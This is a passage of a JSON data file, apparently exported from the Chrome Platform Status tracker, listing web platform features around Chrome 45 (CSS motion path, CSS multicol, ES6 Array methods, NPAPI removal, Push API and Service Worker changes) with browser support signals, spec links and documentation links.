        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "http://crbug.com/496518",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/cssmotionpath",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Motion paths allow authors to animate any graphical object along an author-specified path.\r\n\r\nThe following CSS properties are defined:\r\nmotion-offset\r\nmotion-path\r\nmotion-rotation\r\nmotion (shorthand)\r\n",
    "id": 6190642178818048,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/motion",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/motion-path",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/motion-offset",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/motion-rotation"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/css-motion-path/index.html",
        "http://bit.ly/1HLfdrv"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:15.376050",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Multi-column (new implementation)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/css-multicol/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=684062",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "mstensho@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=334335",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/library/hh673534",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Ship the flow thread based multicol implementation, so that we eventually can bring Blink's multicol support to a level that matches other engines' (Presto and Trident).",
    "id": 6526151266664448,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Using_multi-column_layouts"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/multi-column-css/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-26 06:59:23.915070",
      "by": "Patket@microsoft.com"
    },
    "name": "CSSGroupingRule",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/cssom/#the-cssgroupingrule-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/20",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "ramya.v@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "ios": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=496381",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSSGroupingRule interface represents an at-rule that contains other rules nested inside itself. Per spec, CSSMediaRule and CSSPageRule inherit from CSSGroupingRule.",
    "id": 4588424996585472,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CSSGroupingRule",
        "https://developer.mozilla.org/en-US/docs/Web/API/CSSMediaRule",
        "https://developer.mozilla.org/en-US/docs/Web/API/CSSPageRule"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:55.318420",
      "by": "ericbidelman@google.com"
    },
    "name": "CSSKeyframesRule.insertRule()",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/css-animations/#interface-csskeyframesrule",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=470400",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Replaced by CSSKeyframesRule.appendRule()",
    "id": 5699616519487488,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CSSKeyframesRule"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:29.576010",
      "by": "ericbidelman@google.com"
    },
    "name": "CSSUnknownRule",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.w3.org/TR/DOM-Level-2-Style/css.html#CSS-CSSUnknownRule",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "sunil.ratnu@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=496383",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSSUnknownRule interface represents an at-rule not supported by this user agent.",
    "id": 4693141533753344,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CSSRule"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:42.797300",
      "by": "ericbidelman@google.com"
    },
    "name": "Document's \"first-party\" takes ancestors into account.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-west-first-party-cookies",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Tech/XPCOM/Reference/Interface/mozIThirdPartyUtil",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://crbug.com/477578",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "I'd like to make a small change to the definition of \"first-party\" that we use for third-party cookie blocking: we currently look only at the top-level origin to determine the first-party origin for a request. I'd like to start walking the whole ancestor chain of a frame.",
    "id": 5592111340584960,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-26 06:52:44.187330",
      "by": "Patket@microsoft.com"
    },
    "name": "Document.charset setter",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=438392",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Document.charset is a non-standard IDL attribute supported by all engines except Gecko, with a proposal to standardize it:\r\nhttps://www.w3.org/Bugs/Public/show_bug.cgi?id=27436\r\n\r\nIn order to simplify standardization, Document.charset has been made readonly, as a simple alias of Document.characterSet.",
    "id": 6212846455095296,
    "resources": {
      "docs": [
        "https://www.w3.org/Bugs/Public/show_bug.cgi?id=27436",
        "https://developer.mozilla.org/en-US/docs/Web/API/Document/characterSet"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-02-15 22:31:50.876010",
      "by": "jmedley@google.com"
    },
    "name": "ES6 Array methods",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-array-constructor",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "littledan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3578",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Additional static methods on Array and instance methods on Array.prototype: Array.from, Array.of, Array.prototype.copyWithin, Array.prototype.fill, Array.prototype.find, Array.prototype.findIndex",
    "id": 6732923508097024,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array#Methods"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/array-methods-es6/index.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:33.161050",
      "by": "ericbidelman@google.com"
    },
    "name": "ES6 TypedArray methods",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-typedarray-objects",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "littledan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3578",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/typedarrayses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Additional static methods on concrete TypedArray subclasses (Int8Array, Float32Array, etc) and instance methods on their prototypes. Includes most of the existing Array methods, as well as those added in ES6.",
    "id": 4919908559224832,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray#Methods"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/typedarray-methods-es6/index.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:39.263710",
      "by": "ericbidelman@google.com"
    },
    "name": "NPAPI plug-in support",
    "comments": "Blog post: http://blog.chromium.org/2013/09/saying-goodbye-to-our-old-friend-npapi.html\r\nUpdate blog post: http://blog.chromium.org/2014/05/update-on-npapi-deprecation.html\r\n\r\nDocumentation: http://www.chromium.org/developers/npapi-deprecation\r\n\r\nWill be removed from Linux in M34: https://groups.google.com/a/chromium.org/forum/#!topic/chromium-dev/xEbgvWE7wMk\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "jschuh@chromium.org",
          "komoroske@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "NPAPI’s 90s-era architecture has become a leading cause of hangs, crashes, security incidents, and code complexity in Chrome. Because of this, Chrome will be phasing out NPAPI support in 2013.",
    "id": 5316559090221056,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:59.936260",
      "by": "ericbidelman@google.com"
    },
    "name": "Notification.vibrate",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://notifications.spec.whatwg.org/#dom-notificationoptions-vibrate",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "sh919.park@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=442132",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The vibrate member of the NotificationOptions dictionary allows web developers to specify a vibration pattern for a notification.\r\n\r\nAs of Chrome 53, the `Notification.vibrate` property is exposed as well.",
    "id": 5727996321202176,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/notification/vibrate"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/notifications/vibrate.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:01.859290",
      "by": "ericbidelman@google.com"
    },
    "name": "Object.assign()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Object/assign#Browser_compatibility",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "rossberg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2409",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/objectbuiltinses6/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Object.assign() method is used to copy the values of all enumerable own properties from one or more source objects to a target object. It will return the target object.",
    "id": 5742083411279872,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/object-assign-es6/index.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:38.691440",
      "by": "ericbidelman@google.com"
    },
    "name": "Push API: PushSubscription.subscriptionId",
    "tags": [
      "push",
      "push messaging",
      "push api"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/push-api/#pushsubscription-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/push-api/issues/56",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=477401",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "[Deprecated in Chrome 44, removed in Chrome 45] \r\n\r\nThe Push API previously exposed two properties identifying the subscription: {endpoint, subscriptionId}.\r\n\r\nThese will be merged to be only a single property: endpoint.\r\n\r\nDevelopers can update their implementation by only considering endpoint if it considers the contents of subscriptionId.",
    "id": 5283829761703936,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PushSubscription/subscriptionId",
        "",
        "https://developer.mozilla.org/en-US/docs/Web/API/PushSubscription/endpoint",
        "http://updates.html5rocks.com/2015/05/Notifying-you-of-notificiation-changes"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/push-messaging-and-notifications"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-07-21 08:37:33.269500",
      "by": "ericbidelman@google.com"
    },
    "name": "Push API: gcm_user_visible_only deprecation",
    "tags": [
      "push",
      "push messaging",
      "push api",
      "userVisibleOnly"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/push-api/#pushsubscriptionoptions-dictionary",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/push-api/pull/131",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PushAPI"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=471534",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "[Deprecated in Chrome 44, removed in Chrome 45]\r\n\r\nWe asked developers to indicate their intent to only send push messages that result in user visible UI - Web Notifications, by including the \"gcm_user_visible_only\" key in their Manifest.\r\n\r\nWe are now removing this key in favor of the specified solution: userVisibleOnly. The subscribe() method should be updated like this:\r\n\r\nserviceWorkerRegistration.pushManager.subscribe({\r\n  userVisibleOnly: true\r\n}).then(...)\r\n",
    "id": 5778950739460096,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PushManager/subscribe",
        "http://updates.html5rocks.com/2015/05/Notifying-you-of-notificiation-changes"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/push-messaging-and-notifications"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:32.188890",
      "by": "ericbidelman@google.com"
    },
    "name": "Range.compareNode() and Range.expand()",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=445218",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "These are non-standard extensions to the Range interface introduced in 2006 and 2009 respectively:\r\nhttps://trac.webkit.org/changeset/48271\r\nhttps://trac.webkit.org/changeset/16302",
    "id": 4846282115907584,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/range/compareNode",
        "https://msdn.microsoft.com/library/ms536421(v=vs.85).aspx"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:38.098330",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove filterRes attribute",
    "tags": [
      "filterres",
      "svg"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.w3.org/TR/filter-effects/#element-attrdef-filter-filterres",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.w3.org/Bugs/Public/show_bug.cgi?id=24900",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "pdr@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We plan to remove the filterRes attribute to align with the spec (http://www.w3.org/TR/filter-effects/#element-attrdef-filter-filterres).",
    "id": 5235900443262976,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/filterRes"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:29:26.125360",
      "by": "ericbidelman@google.com"
    },
    "name": "Service Worker: Client.id",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://hg.mozilla.org/mozilla-central/file/7b0df70e27ea/dom/webidl/Client.webidl",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "jungkee.song@samsung.com",
          "falken@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=504222",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Client.id is a GUID allowing the ServiceWorker to track client objects between SW termination & restart.\r\n",
    "id": 4673870283931648,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Client/id"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-04-26 06:42:21.527440",
      "by": "Patket@microsoft.com"
    },
    "name": "Service Worker: Client.postMessage() and ServiceWorkerMessageEvent",
    "tags": [
      "serviceworker",
      "service",
      "worker",
      "postmessage",
      "client",
      "serviceworkermessageevent"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/#serviceworkermessage-event-section",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/slightlyoff/ServiceWorker/issues/669#issuecomment-106333033",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "xiang.long@intel.com",
          "falken@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=498596",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Before Chrome 45, a Service Worker sending a message via Client.postMessage() results in a MessageEvent fired on the Client's global scope (e.g., window). Since Chrome 45, the event is a ServiceWorkerMessageEvent fired on  navigator.serviceWorker rather than window.\r\n\r\nUntil Chrome 45, Client.postMessage displayed an \"experimental, may change\" deprecation warning.",
    "id": 5163630974730240,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerMessageEvent",
        "https://developer.mozilla.org/en-US/docs/Web/API/Client/postMessage"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/service-worker/post-message/index.html"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:30:02.577190",
      "by": "ericbidelman@google.com"
    },
    "name": "Service Worker: ServiceWorkerContainer.getRegistrations()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
